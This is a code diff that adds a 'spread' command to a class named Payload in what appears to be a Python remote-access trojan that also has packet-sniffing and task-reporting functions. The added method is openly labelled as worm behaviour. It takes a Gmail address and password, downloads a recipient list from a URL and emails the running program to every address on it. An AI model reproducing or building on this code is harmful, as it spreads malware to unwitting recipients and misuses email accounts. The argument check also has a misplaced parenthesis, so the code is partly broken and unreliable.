@@ -963,6 +963,28 @@ class Payload():
         except Exception as e:
             log("{} error: {}".format(self.packetsniffer.func_name, str(e)))
 
+    @config(platforms=['win32','darwin','linux2'], command=True, usage='spread <gmail> <password>')
+    def spread(self, args=None):
+        """
+        Activate worm-like behavior and begin spreading client via email
+
+        `Required`
+        :param str email:       sender Gmail address
+        :param str password:    sender Gmail password
+        :param str url:         URL of target email list
+        """
+        if not args or len(str(args.split()) != 3):
+            return self.spread.usage
+        if 'spreader' not in globals():
+            self.load('spreader')
+        try:
+            attachment = sys.argv[0]
+            gmail, password, url = args.split()
+            recipients = urllib.urlopen(url).read().splitlines()
+            return globals()['spreader'].run(gmail, password, attachment, recipients)
+        except Exception as e:
+            return '{} error: {}'.format(self.spread.func_name, str(e))
+
     def send_task(self, task):
         """
         Send task results to the server
